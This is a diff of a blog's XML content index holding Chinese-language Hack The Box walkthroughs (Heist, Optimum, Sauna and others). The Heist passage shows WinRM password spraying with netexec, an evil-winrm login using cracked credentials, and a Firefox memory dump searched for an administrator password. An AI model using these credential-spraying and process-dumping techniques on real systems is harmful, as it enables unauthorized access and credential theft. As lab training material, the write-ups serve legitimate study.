+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1012</span>: SUPPORTDESK<span class="token punctuation">\</span>Chase <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1013</span>: SUPPORTDESK<span class="token punctuation">\</span>Jason <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
+</code></pre>
+
+<h3 id="winrm-爆破"><a href="#winrm-爆破" class="headerlink" title="winrm 爆破"></a>winrm 爆破</h3><p>目标开放了5985 将收集到的所有用户和口令对winrm 进行爆破</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ netexec winrm heist.htb  <span class="token parameter variable">-u</span> user.txt <span class="token parameter variable">-p</span> pass.txt --continue-on-success 
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">17763</span> <span class="token punctuation">(</span>name:SUPPORTDESK<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SupportDesk<span class="token punctuation">)</span>
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:<span class="token variable">$uperP</span>@ssword
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:<span class="token variable">$uperP</span>@ssword
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:<span class="token variable">$uperP</span>@ssword
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:<span class="token variable">$uperP</span>@ssword
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Chase:<span class="token variable">$uperP</span>@ssword
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:<span class="token variable">$uperP</span>@ssword
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Chase:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:stealth1agent
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:stealth1agent
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:stealth1agent
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:stealth1agent
+WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:stealth1agent
+                                                                                      </code></pre>
+
+<p>使用evil-winrm 登录用户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.10.149 <span class="token parameter variable">-u</span> Chase  <span class="token parameter variable">-p</span> <span class="token string">'Q4)sJu\Y8qz*A3?d'</span>
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' <span class="token keyword">for</span> module Reline
+                                        
+Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
+supportdesk<span class="token punctuation">\</span>chase
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>
+
+    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        <span class="token number">4</span>/22/2019   <span class="token number">9</span>:08 AM            <span class="token number">121</span> todo.txt
+-ar---        <span class="token number">3</span>/22/2025   <span class="token number">9</span>:08 AM             <span class="token number">34</span> user.txt</code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看进程，发现firefox </p>
+<pre class="language-cmd" data-language="cmd"><code class="language-cmd">*Evil-WinRM* PS C:\Users\Chase&gt; ps
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    454      17     2264       5332               364   0 csrss
+    291      13     2288       5168               480   1 csrss
+    357      15     3480      14584              2468   1 ctfmon
+    252      14     3936      13428              3832   0 dllhost
+    166       9     1824       9748       0.02   6648   1 dllhost
+    615      32    30096      57836               980   1 dwm
+   1489      57    23924      78568              5088   1 explorer
+   1053      69   143248     219100       2.95   6300   1 firefox
+    347      19    10232      39812       0.03   6408   1 firefox
+    401      33    31456      90444       0.34   6560   1 firefox
+    378      28    22220      59020       0.16   6836   1 firefox
+    355      25    16376      38944       0.05   7116   1 firefox
+     49       6     1516       3872               788   0 fontdrvhost
+     49       6     1804       4648               796   1 fontdrvhost
+      0       0       56          8                 0   0 Idle
+    &lt;...&gt;
+    342      16     8352      18156              3972   0 WmiPrvSE
+   2264      28    89968     107400       0.70   3004   0 wsmprovhost</code></pre>
+
+<p>上传procdump64.exe 和strings64.exe 对firefox 进行dump</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> .<span class="token punctuation">\</span>procdump64.exe <span class="token parameter variable">-accepteula</span> <span class="token parameter variable">-ma</span> <span class="token number">6408</span>
+
+ProcDump v11.0 - Sysinternals process dump utility
+Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2009</span>-2022 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+<span class="token punctuation">[</span><span class="token number">11</span>:07:56<span class="token punctuation">]</span> Dump <span class="token number">1</span> initiated: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>firefox.exe_250322_110756.dmp
+<span class="token punctuation">[</span><span class="token number">11</span>:07:56<span class="token punctuation">]</span> Dump <span class="token number">1</span> writing: Estimated dump <span class="token function">file</span> size is <span class="token number">289</span> MB.
+<span class="token punctuation">[</span><span class="token number">11</span>:07:57<span class="token punctuation">]</span> Dump <span class="token number">1</span> complete: <span class="token number">289</span> MB written <span class="token keyword">in</span> <span class="token number">1.1</span> seconds
+<span class="token punctuation">[</span><span class="token number">11</span>:07:58<span class="token punctuation">]</span> Dump count reached.
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> .<span class="token punctuation">\</span>strings64.exe <span class="token parameter variable">-accepteula</span> firefox.exe_250322_110756.dmp <span class="token operator">></span> firefox.exe_250322_110756.txt 
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> findstr <span class="token string">"password"</span> ./firefox.exe_250322_110756.txt
+<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>                  
+<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>                  
+<span class="token assign-left variable">RG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>
+<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>
+browser.safebrowsing.passwords.enabled    
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>
+
+<p>使用获取到的密码登录目标，获取到管理员权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> heist.htb <span class="token parameter variable">-u</span> administrator  <span class="token parameter variable">-p</span> <span class="token string">'4dD!5&#125;x/re8]FBuZ'</span>  
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' <span class="token keyword">for</span> module Reline
+                                        
+Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>
+
+    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        <span class="token number">3</span>/22/2025   <span class="token number">9</span>:08 AM             <span class="token number">34</span> root.txt</code></pre>
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Flag1</td>
+<td>C:\Users\Chase\Desktop\user.txt</td>
+</tr>
+<tr>
+<td>Flag2</td>
+<td>C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>未授权访问</tag>
+        <tag>敏感信息泄漏</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Jerry</title>
     <url>/Hackthebox/htb/htb-jerry/</url>
-    <content><![CDATA[<style>.hdpvfsadjkqt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="hdpvfsadjkqt">
+    <content><![CDATA[<style>.xvdusdgogrfb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="xvdusdgogrfb">
 
 <span id="more"></span>
 
@@ -1192,7 +1488,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Knife</title>
     <url>/Hackthebox/htb/htb-knife/</url>
-    <content><![CDATA[<style>.ozaobesumdde{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="ozaobesumdde">
+    <content><![CDATA[<style>.czzrdxcjhvmz{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="czzrdxcjhvmz">
 
 <span id="more"></span>
 
@@ -1259,7 +1555,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Lame</title>
     <url>/Hackthebox/htb/htb-lame/</url>
-    <content><![CDATA[<style>.xvhdtrkncsnn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="xvhdtrkncsnn">
+    <content><![CDATA[<style>.sdmigbkxdumj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="sdmigbkxdumj">
 
 <span id="more"></span>
 
@@ -1275,11 +1571,11 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.fvolqicoodyv{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="fvolqicoodyv" alt="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.xbruzbrwvkdl{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="xbruzbrwvkdl" alt="Nmap">
 
 <p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/Hackthebox/htb/htb-lame/image-20250201160141376.png" class="" title="searchploit"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
-<style>.vbpmaxanfurs{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="vbpmaxanfurs" alt="msfconsole">
+<style>.lyeqzrrbsvfo{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="lyeqzrrbsvfo" alt="msfconsole">
 
 <img src="/Hackthebox/htb/htb-lame/image-20250201175040335.png" class="" title="searchsploit">
 
@@ -1312,7 +1608,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Legacy</title>
     <url>/Hackthebox/htb/htb-legacy/</url>
-    <content><![CDATA[<style>.kdcdebfdydgn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="kdcdebfdydgn">
+    <content><![CDATA[<style>.ccqbejkenfgf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="ccqbejkenfgf">
 
 <span id="more"></span>
 
@@ -1360,7 +1656,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Love</title>
     <url>/Hackthebox/htb/htb-love/</url>
-    <content><![CDATA[<style>.jwujbowkyvdm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="jwujbowkyvdm">
+    <content><![CDATA[<style>.rdienpjsgcmd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="rdienpjsgcmd">
 
 <span id="more"></span>
 
@@ -1566,9 +1862,71 @@ Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</cod
       </tags>
   </entry>
   <entry>
+    <title>HTB-Optimum</title>
+    <url>/Hackthebox/htb/htb-optimum/</url>
+    <content><![CDATA[<style>.wrkiwmxogjds{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="wrkiwmxogjds">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-optimum/image-20250202180408340.png" class="" title="nmap">
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问目标</p>
+<img src="/Hackthebox/htb/htb-optimum/image-20250203223205864.png" class="" title="获取版本信息">
+
+<p>使用searchsploit 检索可利用漏洞，发现目标可能存在RCE</p>
+<img src="/Hackthebox/htb/htb-optimum/image-20250203223259584.png" class="" title="searchsploit">
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole进行漏洞利用</p>
+<img src="/Hackthebox/htb/htb-optimum/image-20250203223401263.png" class="" title="漏洞利用">
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>post/multi/recon/local_exploit_suggester</code>检测下当前系统可利用的提权漏洞</p>
+<img src="/Hackthebox/htb/htb-optimum/image-20250203223426591.png" class="" title="收集信息">
+
+<p>根据结果使用ms16_032 进行权限提升</p>
+<img src="/Hackthebox/htb/htb-optimum/image-20250202185340241.png" class="" title="提权">
+
+
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Users\kostas\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Mirai</title>
     <url>/Hackthebox/htb/htb-mirai/</url>
-    <content><![CDATA[<style>.ddcsolrrniqd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="ddcsolrrniqd">
+    <content><![CDATA[<style>.dgpktbjdwrst{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="dgpktbjdwrst">
 
 <span id="more"></span>
 
@@ -1753,71 +2111,9 @@ Do you know <span class="token keyword">if</span> there is any way to get them b
       </tags>
   </entry>
   <entry>
-    <title>HTB-Optimum</title>
-    <url>/Hackthebox/htb/htb-optimum/</url>
-    <content><![CDATA[<style>.nhjbqatxgfzw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="nhjbqatxgfzw">
-
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th align="left">OS</th>
-<th align="left">Difficulty</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Windows</td>
-<td align="left">Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-optimum/image-20250202180408340.png" class="" title="nmap">
-
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问目标</p>
-<img src="/Hackthebox/htb/htb-optimum/image-20250203223205864.png" class="" title="获取版本信息">
-
-<p>使用searchsploit 检索可利用漏洞，发现目标可能存在RCE</p>
-<img src="/Hackthebox/htb/htb-optimum/image-20250203223259584.png" class="" title="searchsploit">
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole进行漏洞利用</p>
-<img src="/Hackthebox/htb/htb-optimum/image-20250203223401263.png" class="" title="漏洞利用">
-
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>post/multi/recon/local_exploit_suggester</code>检测下当前系统可利用的提权漏洞</p>
-<img src="/Hackthebox/htb/htb-optimum/image-20250203223426591.png" class="" title="收集信息">
-
-<p>根据结果使用ms16_032 进行权限提升</p>
-<img src="/Hackthebox/htb/htb-optimum/image-20250202185340241.png" class="" title="提权">
-
-
-
-<table>
-<thead>
-<tr>
-<th align="left">Flag</th>
-<th align="left">Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Flag1</td>
-<td align="left">C:\Users\kostas\Desktop\user.txt</td>
-</tr>
-<tr>
-<td align="left">Flag2</td>
-<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Hackthebox</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Remote</title>
     <url>/Hackthebox/htb/htb-remote/</url>
-    <content><![CDATA[<style>.uoxhhrnakygv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="uoxhhrnakygv">
+    <content><![CDATA[<style>.edjpndedcrvh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="edjpndedcrvh">
 
 <span id="more"></span>
 
@@ -2056,9 +2352,275 @@ meterpreter <span class="token operator">></span>
       </tags>
   </entry>
   <entry>
+    <title>HTB-Sauna</title>
+    <url>/Hackthebox/htb/htb-sauna/</url>
+    <content><![CDATA[<style>.yylytcjckvhu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="yylytcjckvhu">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span>  
+Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-22 <span class="token number">15</span>:19 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.175
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65515</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT      STATE SERVICE       VERSION
+<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token operator">|</span>_http-title: Egotistical Bank :: Home
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2025</span>-03-22 <span class="token number">14</span>:03:56Z<span class="token punctuation">)</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
+<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
+<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
+<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
+<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Not Found
+<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
+<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49673</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">49674</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49677</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49695</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49717</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+Service Info: Host: SAUNA<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="token operator">|</span> smb2-time: 
+<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-22T14:04:50
+<span class="token operator">|</span>_  start_date: N/A
+<span class="token operator">|</span>_clock-skew: 6h41m33s
+<span class="token operator">|</span> smb2-security-mode: 
+<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
+<span class="token operator">|</span>_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">278.88</span> seconds
+</code></pre>
+
